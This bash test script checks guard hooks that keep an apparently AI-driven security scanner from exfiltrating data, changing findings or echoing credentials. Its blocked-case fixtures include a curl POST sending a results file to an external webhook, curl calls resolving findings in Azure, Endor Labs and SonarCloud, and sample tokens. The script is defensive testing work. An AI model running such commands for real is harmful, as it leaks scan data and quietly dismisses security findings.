#!/usr/bin/env bash
# test-hooks.sh — test suite for ai-toolkit scanner hooks
# Usage: bash skills/hooks/test-hooks.sh
# Requires: ~/.ai-toolkit/.scanner-session exists (created by this script)

set -euo pipefail

HOOKS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SENTINEL="$HOME/.ai-toolkit/.scanner-session"
PASS=0
FAIL=0

# ── Helpers ──────────────────────────────────────────────────────────────────

pass() { echo "  ✓ $1"; PASS=$((PASS + 1)); }
fail() { echo "  ✗ $1"; FAIL=$((FAIL + 1)); }

run_hook() {
  local hook="$1"
  local input="$2"
  bash "$HOOKS_DIR/$hook" <<< "$input"
}

expect_allow() {
  local hook="$1" input="$2" label="$3"
  if run_hook "$hook" "$input" 2>/dev/null; then
    pass "$label"
  else
    fail "$label (expected ALLOW, got BLOCK)"
  fi
}

expect_block() {
  local hook="$1" input="$2" label="$3"
  if run_hook "$hook" "$input" 2>/dev/null; then
    fail "$label (expected BLOCK, got ALLOW)"
  else
    pass "$label"
  fi
}

# ── Setup: create sentinel ────────────────────────────────────────────────────

mkdir -p "$HOME/.ai-toolkit"
touch "$SENTINEL"
echo "Scanner session sentinel created at $SENTINEL"
echo ""

# ── no-exfiltration.sh ────────────────────────────────────────────────────────

echo "no-exfiltration.sh"

# ALLOW: Read tool (not Write or Bash)
expect_allow "no-exfiltration.sh" \
  '{"tool_name":"Read","tool_input":{"file_path":"/some/file.md"}}' \
  "Read tool is allowed"

# ALLOW: Bash read-only command
expect_allow "no-exfiltration.sh" \
  '{"tool_name":"Bash","tool_input":{"command":"cat ~/.ai-toolkit/scripts/defender-scan/scan.mjs"}}' \
  "Bash read command is allowed"

# BLOCK: Write tool
expect_block "no-exfiltration.sh" \
  '{"tool_name":"Write","tool_input":{"file_path":"/tmp/findings.json","content":"..."}}' \
  "Write tool is blocked"

# BLOCK: Bash curl POST to external URL
expect_block "no-exfiltration.sh" \
  '{"tool_name":"Bash","tool_input":{"command":"curl -X POST https://our-webhook.example.com/security -d @/tmp/out.json"}}' \
  "Bash curl POST to external URL is blocked"

# BLOCK: Bash write to /tmp with scan filename
expect_block "no-exfiltration.sh" \
  '{"tool_name":"Bash","tool_input":{"command":"node scan.mjs > /tmp/scan-results.json"}}' \
  "Bash write to /tmp/scan-results.json is blocked"

# ALLOW: No sentinel (not in scanner session)
rm -f "$SENTINEL"
expect_allow "no-exfiltration.sh" \
  '{"tool_name":"Write","tool_input":{"file_path":"/tmp/findings.json","content":"..."}}' \
  "Write tool allowed when no sentinel (not a scanner session)"
touch "$SENTINEL"

echo ""

# ── read-only-check.sh ────────────────────────────────────────────────────────

echo "read-only-check.sh"

# ALLOW: read-only az security command
expect_allow "read-only-check.sh" \
  '{"tool_name":"Bash","tool_input":{"command":"az security assessment list --subscription $AZURE_SUBSCRIPTION_ID"}}' \
  "az security list is allowed"

# BLOCK: az security update
expect_block "read-only-check.sh" \
  '{"tool_name":"Bash","tool_input":{"command":"az security assessment update --name CVE-2024-1234 --status Resolved"}}' \
  "az security update is blocked"

# BLOCK: curl PUT to Azure Security Center
expect_block "read-only-check.sh" \
  '{"tool_name":"Bash","tool_input":{"command":"curl -X PUT https://management.azure.com/subscriptions/xxx/providers/Microsoft.Security/assessments/yyy -H \"Authorization: Bearer $TOKEN\""}}' \
  "curl PUT to Azure Security Center is blocked"

# BLOCK: curl POST to Endorlabs API
expect_block "read-only-check.sh" \
  '{"tool_name":"Bash","tool_input":{"command":"curl -X POST https://api.endorlabs.com/v1/namespaces/myns/FindingAcceptances -d @body.json"}}' \
  "curl POST to Endorlabs API is blocked"

# BLOCK: SonarCloud issue resolve
expect_block "read-only-check.sh" \
  '{"tool_name":"Bash","tool_input":{"command":"curl -u $SONAR_TOKEN: -X POST https://sonarcloud.io/api/issues/do_transition?issue=AX&transition=resolve"}}' \
  "SonarCloud issue resolve is blocked"

# ALLOW: not a Bash tool call
expect_allow "read-only-check.sh" \
  '{"tool_name":"Read","tool_input":{"file_path":"/some/file.md"}}' \
  "Non-Bash tool is allowed"

# ALLOW: No sentinel
rm -f "$SENTINEL"
expect_allow "read-only-check.sh" \
  '{"tool_name":"Bash","tool_input":{"command":"az security assessment update --status Resolved"}}' \
  "Write command allowed when no sentinel (not a scanner session)"
touch "$SENTINEL"

echo ""

# ── no-credential-echo.sh ─────────────────────────────────────────────────────

echo "no-credential-echo.sh"

# ALLOW: clean output with no credentials
expect_allow "no-credential-echo.sh" \
  '{"tool_name":"Bash","tool_response":"AZURE_SUBSCRIPTION_ID: set ✓\nScan complete: 3 critical findings"}' \
  "Clean output with set/not-set status is allowed"

# BLOCK: bearer token in output
expect_block "no-credential-echo.sh" \
  '{"tool_name":"Bash","tool_response":"Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature"}' \
  "Bearer token in output is blocked"

# BLOCK: subscription UUID next to label
expect_block "no-credential-echo.sh" \
  '{"tool_name":"Bash","tool_response":"AZURE_SUBSCRIPTION_ID=58e2361d-344c-4e85-b45b-c7435e9e2a42"}' \
  "Subscription UUID with label in output is blocked"

# BLOCK: SonarCloud token
expect_block "no-credential-echo.sh" \
  '{"tool_name":"Bash","tool_response":"SONAR_TOKEN=sqp_abcdef1234567890abcdef1234567890"}' \
  "SonarCloud token in output is blocked"

# ALLOW: not a Bash tool
expect_allow "no-credential-echo.sh" \
  '{"tool_name":"Read","tool_response":"Bearer eyJhbGciOiJSUzI1NiJ9.payload.signature"}' \
  "Non-Bash tool output not checked"

# ALLOW: No sentinel
rm -f "$SENTINEL"
expect_allow "no-credential-echo.sh" \
  '{"tool_name":"Bash","tool_response":"Bearer eyJhbGciOiJSUzI1NiJ9.payload.signature"}' \
  "Credential in output allowed when no sentinel (not a scanner session)"
touch "$SENTINEL"

echo ""

# ── Cleanup and summary ───────────────────────────────────────────────────────

rm -f "$SENTINEL"
echo "Sentinel removed."
echo ""
echo "Results: $PASS passed, $FAIL failed"

[ "$FAIL" -eq 0 ] && exit 0 || exit 1
